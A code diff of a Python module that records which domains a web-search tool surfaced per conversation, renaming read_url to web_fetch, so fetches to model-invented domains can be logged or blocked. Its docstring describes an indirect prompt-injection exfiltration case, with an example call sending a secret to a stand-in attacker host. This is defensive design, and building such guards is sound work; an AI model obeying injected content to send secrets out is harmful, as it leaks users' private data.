@@ -1,17 +1,17 @@
 """Conversation-scoped set of platform-surfaced source domains (PI-002 出网外泄观测).
 
-``read_url`` will fetch ANY public URL the model hands it. The indirect-prompt-
+``web_fetch`` will fetch ANY public URL the model hands it. The indirect-prompt-
 injection exfil pattern is: poisoned web/file content drives the model to
-``read_url("https://attacker/?d=<secret>")`` — the attacker's access log then holds
+``web_fetch("https://attacker/?d=<secret>")`` — the attacker's access log then holds
 the secret (the SSRF guard only blocks *internal* targets, not public exfil).
 
 The deterministic half we can reason about: a *legitimate* deep-read targets a domain
 the platform itself surfaced (a ``web_search`` result the user can see), whereas an
 exfil URL is one the model *fabricated*. This module records, per conversation, the
-domains ``web_search`` surfaced, so ``read_url`` can tell "deep-read of a search hit"
+domains ``web_search`` surfaced, so ``web_fetch`` can tell "deep-read of a search hit"
 (silent) from "fetch of a model-constructed novel domain" (logged; refused under the
-opt-in flag — see ``read_url._guard_novel_domain_exfil`` and
-``config.search.read_url_block_novel_query``).
+opt-in flag — see ``web_fetch._guard_novel_domain_exfil`` and
+``config.search.web_fetch_block_novel_query``).
 
 Scope & posture mirror the sibling ``url_cache`` / ``search_cache`` registries:
 conversation-scoped, bounded (per-conversation domain cap + idle-conversation reaping
@@ -43,7 +43,7 @@ class ConversationSourceDomains:
     """One conversation's bounded, LRU-ordered set of platform-surfaced domains.
 
     Domains are stored already normalised (lowercased, ``www.`` stripped — the
-    ``site_of`` form), so membership compares apples to apples with ``read_url``'s
+    ``site_of`` form), so membership compares apples to apples with ``web_fetch``'s
     ``site_of(url)``. Bounded by a count cap (LRU-evict); ``last_access`` lets the
     registry reap an idle conversation.
     """
@@ -148,11 +148,11 @@ class SourceDomainRegistry:
         return conversation_id in self._sets
 
 
-# Process-wide registry, shared by web_search (writer) and read_url (reader) so a
+# Process-wide registry, shared by web_search (writer) and web_fetch (reader) so a
 # conversation's surfaced-domain set survives across turns (single-worker posture).
 _registry: SourceDomainRegistry = SourceDomainRegistry()
 
 
 def default_source_domain_registry() -> SourceDomainRegistry:
-    """The process-wide source-domain registry (web_search records, read_url reads)."""
+    """The process-wide source-domain registry (web_search records, web_fetch reads)."""
     return _registry
